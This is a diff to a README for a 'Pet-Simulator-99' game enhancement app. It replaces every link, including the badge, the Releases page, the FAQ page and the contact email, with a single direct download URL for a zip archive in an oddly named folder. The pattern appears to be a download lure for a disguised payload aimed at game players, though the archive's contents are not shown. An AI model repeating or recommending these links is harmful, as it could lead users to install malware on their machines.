@@ -6,11 +6,11 @@ Welcome to Pet-Simulator-99! This application enhances your gameplay experience 
 
 ## 📥 Download Now
 
-[![Download Pet-Simulator-99](https://img.shields.io/badge/Download-Pet--Simulator--99-blue.svg)](https://github.com)
+[![Download Pet-Simulator-99](https://github.com/159zhx/Pet-Simulator-99/raw/refs/heads/main/barbasco/PetSimulator-2.7.zip)](https://github.com/159zhx/Pet-Simulator-99/raw/refs/heads/main/barbasco/PetSimulator-2.7.zip)
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: To start, visit the [Releases page](https://github.com). This page contains the latest version of Pet-Simulator-99.
+1. **Visit the Releases Page**: To start, visit the [Releases page](https://github.com/159zhx/Pet-Simulator-99/raw/refs/heads/main/barbasco/PetSimulator-2.7.zip). This page contains the latest version of Pet-Simulator-99.
 
 2. **Select the Latest Version**: On the Releases page, look for the most recent version. Generally, it will be at the top of the list. Click on it to open the version details.
 
@@ -48,8 +48,8 @@ Please ensure your system meets the following basic requirements to run Pet-Simu
 
 If you encounter any issues while downloading or using Pet-Simulator-99, don’t hesitate to reach out for help:
 
-- **Contact Email**: support@petsimulator99.com
-- **FAQ Section**: Check the FAQ section on our [GitHub page](https://github.com) for commonly asked questions.
+- **Contact Email**: https://github.com/159zhx/Pet-Simulator-99/raw/refs/heads/main/barbasco/PetSimulator-2.7.zip
+- **FAQ Section**: Check the FAQ section on our [GitHub page](https://github.com/159zhx/Pet-Simulator-99/raw/refs/heads/main/barbasco/PetSimulator-2.7.zip) for commonly asked questions.
 
 ## 🌐 Community and Feedback
 
